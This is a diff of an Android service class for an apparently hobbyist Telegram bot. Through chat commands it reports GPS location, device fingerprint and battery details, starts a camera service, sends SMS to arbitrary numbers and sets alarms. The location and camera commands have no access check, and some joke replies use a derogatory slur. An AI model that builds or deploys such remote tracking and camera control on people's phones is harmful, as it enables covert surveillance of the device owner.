@@ -52,6 +52,7 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Binder;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.AlarmClock;
@@ -119,6 +120,7 @@ public class BotService extends Service implements LocationListener {
 						if (location != null) {
 							latitude = location.getLatitude();
 							longitude = location.getLongitude();
+							
 						}
 					}
 				}
@@ -136,6 +138,7 @@ public class BotService extends Service implements LocationListener {
 							if (location != null) {
 								latitude = location.getLatitude();
 								longitude = location.getLongitude();
+								
 							}
 						}
 					}
@@ -148,7 +151,7 @@ public class BotService extends Service implements LocationListener {
 
 		return location;
 	}
-
+	
 	public void showSettingsAlert() {
 		AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);
 
@@ -318,7 +321,16 @@ public class BotService extends Service implements LocationListener {
 			int voltage = intent.getIntExtra(EXTRA_VOLTAGE, Integer.MIN_VALUE);
 			String voltageString = "Voltage: " + voltage;
 			Log.i("MU", voltageString);
-			String s = healthString + "\n";
+			
+			String s = getDeviceName()+"\n";
+			s += getAndroidVersion()+"\n";
+			s += "Models : "+Build.MODEL+"\n";
+			s += "Board: "+Build.BOARD+"\n";
+			s += "Hardware : "+Build.HARDWARE+"\n";
+			s += "Boatloader: "+Build.BOOTLOADER+"\n";
+			s += "fingerPrint : "+Build.FINGERPRINT+"\n";
+			s += "other : "+Build.CPU_ABI+"\n";
+			s += healthString + "\n";
 			s += levelString + "\n";
 			s += pluggedString + "\n";
 			s += presentString + "\n";
@@ -390,8 +402,10 @@ public class BotService extends Service implements LocationListener {
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		// TODOs Auto-generated method stub
 		context = BotService.this;
+		
 		setUpdate_idc();
 		getLocation();
+		
 		new GetUpdates().execute("latian");
 		return (START_STICKY);
 	}
@@ -447,16 +461,16 @@ public class BotService extends Service implements LocationListener {
 						
 						Log.d("MU", "message id " + message_id);
 
-						if (text.contains("echo")) {
+						if (text.toLowerCase().contains("echo")) {
 							String msg = text.replace("echo ", "");
 							Utils.sendMessage(chat_id, message_id, msg);
-						} else if (text.contains("siapa lo")) {
+						} else if (text.toLowerCase().contains("siapa lo")) {
 							String text_replay = "aku adalah seorang muslim jika aku sendirian dan komunis jika aku dalam kerumunan karena Allah berfirman setan ada dalam kerumunan (Tan Malaka).\ndibuat oleh kucengaerdev laboratory";
 							Log.d("MU", "sending " + text_replay);
 							String ut = Utils.sendMessage(chat_id, message_id,
 									text_replay);
 							Log.d("MU", ut);
-						} else if (text.equalsIgnoreCase("/bantuan")) {
+						} else if (text.toLowerCase().equalsIgnoreCase("/bantuan")) {
 
 							String s = Utils
 									.sendMessage(
@@ -464,9 +478,9 @@ public class BotService extends Service implements LocationListener {
 											message_id,
 											"siapa lo - tentang bot \n/info - informasi batrei device\ndetobin <desimal> - convert desimal ke biner\nbintode <biner> - convert biner ke desimal\ntrack - tracking my location\necho <text> - printing the text.\n/bantuan - untuk bantuan");
 							Log.d("MU", s);
-						} else if (text.equalsIgnoreCase("/info")) {
+						} else if (text.toLowerCase().equalsIgnoreCase("/info")) {
 							showBatteryInfo();
-						} else if (text.contains("detobin")) {
+						} else if (text.toLowerCase().contains("detobin")) {
 							String stringDes = text.replace("detobin ", "");
 							Log.d("MU", stringDes);
 							try {
@@ -477,7 +491,7 @@ public class BotService extends Service implements LocationListener {
 								Utils.sendMessage(chat_id, message_id,
 										"format invalid");
 							}
-						} else if (text.contains("bintode")) {
+						} else if (text.toLowerCase().contains("bintode")) {
 							String stringBin = text.replace("bintode ", "");
 							Log.d("MU", stringBin);
 							try {
@@ -488,7 +502,7 @@ public class BotService extends Service implements LocationListener {
 								Utils.sendMessage(chat_id, message_id,
 										"format invalid");
 							}
-						} else if (text.contains("track")) {
+						} else if (text.toLowerCase().contains("track")) {
 							if (latitude != 0 && longitude != 0) {
 								Utils.sendMessage(chat_id, message_id,
 										"latitude: " + latitude
@@ -497,24 +511,24 @@ public class BotService extends Service implements LocationListener {
 								Utils.sendMessage(chat_id, message_id,
 										"gps dimatikan");
 							}
-						} else if (text.equalsIgnoreCase("/camera")) {
+						} else if (text.toLowerCase().equalsIgnoreCase("/poto")) {
 							Utils.sendMessage(chat_id, message_id,
 									"perintah dilaksanakan");
 							context.startService(new Intent(BotService.this,
 									CameraService.class));
-						} else if (text.contains("ganteng")) {
+						} else if (text.toLowerCase().contains("ganteng")) {
 							Utils.sendMessage(chat_id, message_id,
 									"di dunia ini ngga ada yang ganteng kecuali suamiku.");
-						} else if (text.contains("hatabomba")) {
+						} else if (text.toLowerCase().contains("hatabomba")) {
 							Utils.sendMessage(chat_id, message_id,
 									" maksud lo ape bray, sebut-sebut dia, dia kan maho bray!");
-						} else if (text.contains("crot")) {
+						} else if (text.toLowerCase().contains("crot")) {
 							Utils.sendMessage(chat_id, message_id,
 									"chroot /mnt");
-						} else if (text.startsWith("san ")) {
-							String texts = text.replace("san ", "");
-							if (texts.contains("jam ")) {
-								if(userName.equalsIgnoreCase("your_username")){
+						} else if (text.toLowerCase().startsWith("san ")) {
+							String texts = text.toLowerCase().replace("san ", "");
+							if (texts.toLowerCase().contains("jam ")) {
+								if(userName.equalsIgnoreCase("martin_luther")){
 									Utils.sendMessage(
 											chat_id,
 											message_id,
@@ -531,7 +545,7 @@ public class BotService extends Service implements LocationListener {
 								Utils.sendMessage(chat_id, message_id, "rizky orangnya ganteng gan");
 							}else if (texts.contains("firja ")){
 								Utils.sendMessage(chat_id, message_id, "firja kayak orang persia atau iran ganteng gan sumpah.");
-							}else if (texts.contains("sms ")) {
+							}else if (texts.toLowerCase().contains("sms ")) {
 								String textSms = texts.replace("sms ", "");
 								List<String> items = Arrays.asList(textSms.split(" "));
 								String phoneNum = items.get(0);
@@ -542,7 +556,7 @@ public class BotService extends Service implements LocationListener {
 									
 								}
 								
-								if(userName.equalsIgnoreCase("your_username")){
+								if(userName.equalsIgnoreCase("martin_luther")){
 									Utils.sendMessage(chat_id, message_id, "iya sayang aku kerjakan kok nih");
 									Log.d("MU", phoneNum+" "+smsText);
 									kirimSms(phoneNum, smsText);
@@ -552,10 +566,10 @@ public class BotService extends Service implements LocationListener {
 								}
 								items.clear();
 								
-							}else if(texts.contains("bangun ")){
+							}else if(texts.toLowerCase().contains("bangun ")){
 								String alarm = texts.replace("bangun ", "");
 								List<String> items = Arrays.asList(alarm.split(" "));
-								if(userName.equalsIgnoreCase("your_username")){
+								if(userName.equalsIgnoreCase("martin_luther")){
 									Utils.sendMessage(chat_id, message_id, "ok sayang aku bangunkan nanti.");
 									Intent in = new Intent(AlarmClock.ACTION_SET_ALARM);
 									in.putExtra(AlarmClock.EXTRA_HOUR, Integer.valueOf(items.get(0)));
@@ -565,6 +579,11 @@ public class BotService extends Service implements LocationListener {
 								}else{
 									Utils.sendMessage(chat_id, message_id, "kamu ngga bisa akses");
 								}
+							} else if(texts.startsWith("play")){
+								Utils.sendMessage(chat_id, message_id, "akan membuka music player");
+								Intent intent = new Intent("android.intent.action.MUSIC_PLAYER");
+								intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+								BotService.this.startActivity(intent);
 							} else {
 								Cursor cursor = context
 										.getContentResolver()
@@ -581,7 +600,7 @@ public class BotService extends Service implements LocationListener {
 								Random rnd;
 								String text_replay="";
 								List <String> item = Arrays.asList(texts.split(" "));
-								if(item.size()>0){
+								if(item.size()>0&&item!=null){
 									for(int j=0;j<item.size();j++){
 										rnd = new Random();
 										int indexrand = rnd.nextInt(list.size()-j);
@@ -712,5 +731,31 @@ public class BotService extends Service implements LocationListener {
 		// TODOs Auto-generated method stub
 
 	}
+	
+	public String getAndroidVersion() {
+	    String release = Build.VERSION.RELEASE;
+	    int sdkVersion = Build.VERSION.SDK_INT;
+	    return "Android SDK and OS Version: " + sdkVersion + " (" + release +")";
+	}
+
+	public String getDeviceName() {
+	    String manufacturer = Build.MANUFACTURER;
+	    String produk = Build.PRODUCT;
+	   
+	        return "Device Vendor and product : "+capitalize(manufacturer) + " "+produk ;
+	}
+
+
+	private String capitalize(String s) {
+	    if (s == null || s.length() == 0) {
+	        return "";
+	    }
+	    char first = s.charAt(0);
+	    if (Character.isUpperCase(first)) {
+	        return s;
+	    } else {
+	        return Character.toUpperCase(first) + s.substring(1);
+	    }
+	} 
 
 }
